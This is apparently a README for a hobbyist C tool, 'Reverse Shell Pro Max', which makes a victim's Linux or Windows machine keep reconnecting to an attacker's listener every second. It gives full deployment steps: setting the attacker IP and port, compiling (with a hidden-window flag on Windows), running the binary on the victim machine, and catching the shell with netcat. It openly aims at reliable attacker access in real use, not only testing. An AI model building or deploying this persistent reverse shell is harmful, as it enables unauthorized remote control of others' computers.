# Reverse Shell Pro Max (Project_RSPM)

**Reverse Shell Pro Max (RSPM)** is a persistent reverse shell payload designed to provide continuous, automatic reverse shell connections to an attacker’s machine. Unlike traditional reverse shell tools like **msfvenom**, which only provide a one-time connection, **RSPM** keeps attempting to reconnect every second if the connection is lost, ensuring reliable access for attackers.

---

## Project Structure

The repository is structured as follows:


- **Project_RSPM_UNIX**: Contains C code designed to work on **Linux** systems.
- **Project_RSPM_WIN**: Contains C code designed to work on **Windows** systems.

---

## Features

- **Persistent Connection**: Continuously sends connection requests every second until successful.
- **Automatic Reconnection**: If the connection drops, the reverse shell payload automatically attempts to reconnect.
- **Target Specific IP and Port**: Easily change the IP and port where the reverse shell connects.
- **Works on Linux and Windows**: Separate codebases for each platform, with instructions for compiling and running.

---

## Installation and Usage

### 1. **Linux**

#### Step 1: Modify IP and Port
- Open the C file (`reverse_shell_6th_try_somehow_working.c`) located in the **Project_RSPM_UNIX** folder.
- Modify the `IP` and `PORT` to match the attacker's machine IP and desired port.

    ```c
    #define IP "192.168.100.215" // Replace with your attacker's IP
    #define PORT 4444            // Replace with your desired port
    ```

#### Step 2: Compile the C Code
- Compile the C code using `gcc`:

    ```bash
    gcc -o reverse_shell reverse_shell_6th_try_somehow_working.c
    ```

#### Step 3: Run the Payload
- Run the compiled reverse shell executable on the victim machine:

    ```bash
    ./reverse_shell
    ```

#### Step 4: Listen for Connections
- On your attacker's machine, use `nc` or another listening tool to catch the reverse shell connection:

    ```bash
    nc -lvnp 4444
    ```

---

### 2. **Windows**

#### Step 1: Modify IP and Port
- Open the C file (`reverse_shell_3rd_try_somehow_working.c`) located in the **Project_RSPM_WIN** folder.
- Modify the `IP` and `PORT` to match the attacker's machine IP and desired port.

    ```c
    #define IP "192.168.100.215" // Replace with your attacker's IP
    #define PORT 4444            // Replace with your desired port
    ```

#### Step 2: Install MinGW
- Install MinGW for compiling C code on Windows. If you don't have it installed, use the following command:

    ```bash
    sudo apt install mingw-w64
    ```

#### Step 3: Compile the C Code for Windows
- Compile the C file using the MinGW cross-compiler:

    ```bash
    x86_64-w64-mingw32-gcc reverse_shell_3rd_try_somehow_working.c -o reverse_shell.exe -lws2_32 -mwindows
    ```

#### Step 4: Run the Payload
- Run the compiled executable on the victim’s Windows machine:

    ```bash
    ./reverse_shell.exe
    ```

#### Step 5: Listen for Connections
- On the attacker's machine, listen for the reverse shell connection:

    ```bash
    nc -lvnp 4444
    ```

---

## Contributing

Feel free to open an issue or submit a pull request for improvements or new features. Contributions are welcome!

---

## Incomplete...

This project is incomplete and i made it as i am just a starter to code in c and its somehow working but hope some experienced c programmer will modify it or contribute here...

## ScriptKiddy -> TheGreen
Just randrom thought came on my mind while using msfvenom payload that if are disconnected mistakely then we have to re run the payload in victim machine and in testing it's fine but in doing in real place its simply not possible and i dont know if there is something like this already available or something on github or somewhere on internet but this repo is just a scriptKiddy thoughts and mades ...

